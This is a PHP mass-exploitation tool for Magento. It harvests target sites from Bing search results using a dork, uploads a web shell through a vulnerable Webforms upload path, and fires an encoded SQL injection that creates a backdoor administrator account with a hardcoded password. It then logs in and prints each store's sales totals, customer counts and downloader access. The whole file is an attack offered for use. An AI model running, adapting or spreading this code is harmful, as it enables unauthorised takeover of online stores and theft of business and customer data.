<?php
error_reporting(0);
set_time_limit(0);

class indoxploit_mage_exploit {
	private $jsvulnpath = "/js/webforms/upload/";
	private $postjs = "files[]";

	public function cover() {
		print "[ ========================================== ]\n";
		print "-----> Magento Xploit with Bing Grabber <-----\n";
		print "All in One Package: [webforms,add admin] Xploit\n";
		print "Recode by : H1RUK4 \n";
		print "Big Thanks : JavaGhost - StupidCorp\n";
		print "[ ========================================== ]\n\n";
	}
	public function ngcurl($url,$post=null) {
		$ch = curl_init($url);
		if($post != null) {
	 	 	curl_setopt($ch, CURLOPT_POST, true);
		  	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		}
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		  	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  	curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		return curl_exec($ch);
		  	curl_close($ch);
	}
	public function xploit($url, $post) {
		$ch = curl_init(); 
			  curl_setopt($ch, CURLOPT_URL, $url); 
			  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
			  curl_setopt($ch, CURLOPT_TIMEOUT, 60); 
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			  curl_setopt($ch, CURLOPT_POST, 1); 
		$headers  = array();
		$headers[] = 'Accept-Encoding: gzip, deflate';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
	  		  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
			  curl_setopt($ch, CURLOPT_HEADER, 1);
		return curl_exec($ch);
			  curl_close($ch);
	}
	public function ambilKata($param, $kata1, $kata2){
    	if(strpos($param, $kata1) === FALSE) return FALSE;
    	if(strpos($param, $kata2) === FALSE) return FALSE;
    	$start = strpos($param, $kata1) + strlen($kata1);
    	$end = strpos($param, $kata2, $start);
    	$return = substr($param, $start, $end - $start);
    	return $return;
	}
}

$idx = new indoxploit_mage_exploit();
$shell = "id.php";
$dork = str_replace("'", "", $argv[1]);
$dork = urlencode($dork);
if(isset($dork)) {
	$idx->cover();
	$npage = 1;
	$npages = 30000;
	$allLinks = array();
	$lll = array();
	while($npage <= $npages) {
	    $x = $idx->ngcurl("http://www.bing.com/search?q=".$dork."&first=".$npage."", null);
	    if($x) {
	        preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
	        foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
	        $npage = $npage + 10;
	        if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
	    } else break;
	}
	$URLs = array();
	foreach($allLinks as $url){
	    $exp = explode("/", $url);
	    $URLs[] = $exp[2];
	}
	$array = array_filter($URLs);
	$array = array_unique($array);
	$sss = count(array_unique($array));
	print "Load ($sss) sites\n";
	print "<------------------------>\n\n";
	foreach($array as $domain) {
		if($_SESSION[$domain]) {
			//
		} else {
		$_SESSION[$domain] = "1";	
		// set var all site + path to x
		$domain = "http://$domain"; // URL TARGET
		$domain_exploit = $domain."/index.php/"; // URL to Exploit
		$domain_exploit_add_admin = $domain_exploit."/admin/Cms_Wysiwyg/directive/index/";
		$domain_downloader = $domain."/downloader/"; // URL to Downloader
		$domain_admin = $domain_exploit."/admin/"; // URL to Admin Page
		$domain_js = $domain."/js/webforms/upload/";
		// end set varr all site + path to x
		print "[+] URL: $domain ";
		// set var all curl page
		$cek_web = $idx->ngcurl($domain_exploit, null); // CURL to Index of site
		$cek_downloader = $idx->ngcurl($domain_downloader, null); // CURL to Downloader Site
		$cek_admin = $idx->ngcurl($domain_admin, null); // CURL to Admin Page
		$cek_webforms = $idx->ngcurl($domain_js, null);
		// end var all curl page

		// set all exploit webforms
		$post_js = array("files[]" => "@$shell");
		$exploit_js = $idx->ngcurl($domain_js, $post_js);
		preg_match('/"url":"(.*?)"/', $exploit_js, $sh);
		// end set all exploit webforms

		// set all exploit add admin
		$postdata = 'filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdJbmRvWHBsb2l0JykgKSwgQ09OQ0FUKCc6JywgQFNBTFQgKSk7U0VMRUNUIEBFWFRSQSA6PSBNQVgoZXh0cmEpIEZST00gYWRtaW5fdXNlciBXSEVSRSBleHRyYSBJUyBOT1QgTlVMTDtJTlNFUlQgSU5UTyBgYWRtaW5fdXNlcmAgKGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLGBlbWFpbGAsYHVzZXJuYW1lYCxgcGFzc3dvcmRgLGBjcmVhdGVkYCxgbG9nbnVtYCxgcmVsb2FkX2FjbF9mbGFnYCxgaXNfYWN0aXZlYCxgZXh0cmFgLGBycF90b2tlbmAsYHJwX3Rva2VuX2NyZWF0ZWRfYXRgKSBWQUxVRVMgKCdpbmRvJywneHBsb2l0JywnbmdhbnVAbmdhbnUuY29tJywnaW5kb3hwbG9pdCcsQFBBU1MsTk9XKCksMCwwLDEsQEVYVFJBLE5VTEwsIE5PVygpKTtJTlNFUlQgSU5UTyBgYWRtaW5fcm9sZWAgKHBhcmVudF9pZCx0cmVlX2xldmVsLHNvcnRfb3JkZXIscm9sZV90eXBlLHVzZXJfaWQscm9sZV9uYW1lKSBWQUxVRVMgKDEsMiwwLCdVJywoU0VMRUNUIHVzZXJfaWQgRlJPTSBhZG1pbl91c2VyIFdIRVJFIHVzZXJuYW1lID0gJ2luZG94cGxvaXQnKSwnRmlyc3RuYW1lJyk7%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1';
		$result = $idx->xploit($domain_exploit_add_admin, $postdata);
		$ambil = htmlspecialchars(@file_get_contents($domain_admin));
		preg_match("/<input name=\"form_key\" type=\"hidden\" value=\"(.*?)\">/", $ambil, $key);
		$post_login = array(
    		"form_key" => $key[1],
    		"login[username]" => "indoxploit",
    		"dummy" => "",
    		"login[password]" => "IndoXploit",
    	);
		$login_web = $idx->ngcurl($domain_admin, $post_login);
		preg_match_all('#<span class="price">(.*?)</span>#', $login_web, $matches);
		$links = array_unique($matches[1]);
		preg_match_all('/<span class=\"nowrap\" style=\"font-size:18px; color:#EA7601;\">(.*?)<span/', $login_web, $quality);
		$qual = array_unique($quality[1]);
		$key2 = $idx->ambilKata($login_web,"/filesystem/adminhtml_filesystem/index/key/","/");
    	$curl_filesystem = $idx->ngcurl($domain_exploit."/filesystem/adminhtml_filesystem/index/key/$key2/", null);
    	$post_downloader = array(
    		"username" => "indoxploit",
    		"password" => "IndoXploit",
    	);
    	$curl_downloader = $idx->ngcurl($domain_downloader, $post_downloader);
    	preg_match_all("/<td class=\"first\">(.*?)<\/td>/", $curl_downloader, $pack);
    	$key3 = $idx->ambilKata($login_web,"/customer/index/key/","/");
    	$curl_customer = $idx->ngcurl($domain_exploit."/admin/customer/index/key/$key3/", null);
    	preg_match_all("/<span id=\"customerGrid-total-count\" class=\"no-display\">(.*?)<\/span>/", $curl_customer, $cust);
    	// end set all exploit add admin

		if(preg_match("/Mage.Cookies.domain/", $cek_web) OR preg_match("/magento/", $cek_downloader) OR preg_match("/magento/", $cek_admin)) {
			print "[Magento]\n";
			print "[ ==================================================== ]\n";
			print "[+] Trying to exploit [Webforms]: ";
			if(preg_match("[]", $cek_webforms) AND !preg_match("/404|Not Found|Error|Forbidden|403/i", $cek_webforms)) {
				print "Vuln | ";
				if(preg_match("/{$shell}|webforms/", $exploit_js)) {
					print "Xploited!\n";
					print "[+] Shell: ".str_replace("\\", "", $sh[1])."\n";
				} else {
					print "Not Xploited.\n";	
				}
			} else {
				print "Not Vuln\n";
			}
			print "[+] Trying to exploit [add admin]: ";
			if(preg_match('#200 OK#', $result)) {
				print "Xploited! | ";
				if(preg_match('/Log Out|indoxploit/', $login_web)) {
					print "[Login: OK]\n";
					print "[ ====================[ $$$$$$$$ ]==================== ]\n";
					print "[+] Lifetime Sales: ".$links[0]."\n";
					print "[+] Average Orders: ".$links[1]."\n";
					print "[+] Quantity Orders: ".$qual[3][0]."\n";
					print "[+] Total Customers: ".$cust[1][0]." Customers\n";
					print "[ ====================[ $$$$$$$$ ]==================== ]\n";
					print "[ ====================[ /\/\/\/\ ]==================== ]\n";
					print "[+] Filesystem: ";
					if(preg_match("/File System/", $curl_filesystem)) {
    			   		print "Found!\n";
    			   	} else {
    			   		print "Not Found.\n";
    			   	}
    			   	print "[+] Downloader: ";
    			   	if(preg_match("/Magento Downloader/", $cek_downloader)) {
    		    		print "Found! | ";
    		    		if(preg_match("/Return to Admin|Log Out/i", $curl_downloader)) {
    		    			if(preg_match("/Your Magento folder does not have sufficient write permissions./", $curl_downloader)) {
    		 	   				$stat_down = "Not Writeable.";
    		    			} else {
    		    				$stat_down = "Writeable";
    		    			}
    		    			$in = 0;
    		    			print "[Login: OK] [$stat_down]\n";
    		    			//print "[+] Packages installed: \n";
    		    			foreach($pack[1] as $packages) {
    		    				$in++;
    		    				//print "-> $packages\n";
    		    			}
    		    			print "[+] Installed packages: (".$in.") Packages\n";
    		    		} else {
    		    			print "[Login Downloader Failed]\n";
    		    		}
    		 	   	} else {
    		    		print "[Not Found]\n";
    		  	  	}
    		  	  	print "[ ====================[ \/\/\/\/ ]==================== ]\n";
    		  	  	print "[ ==================================================== ]\n";
    		  	  	print "[+] username: indoxploit\n";
    		  	  	print "[+] password: IndoXploit\n";
					print "[+] Login Admin: $domain_admin\n";
					print "[ ==================================================== ]\n\n";
				} else {
					print "[Login Admin Failed]\n\n";
				}
			} else {
				print "Not Vuln\n\n";
			}
		} else {
			print "[Not Magento]\n\n";
		}
		}
	}
} else {
	print "usage: php ".$argv[0]." 'bing_dork'\n";
}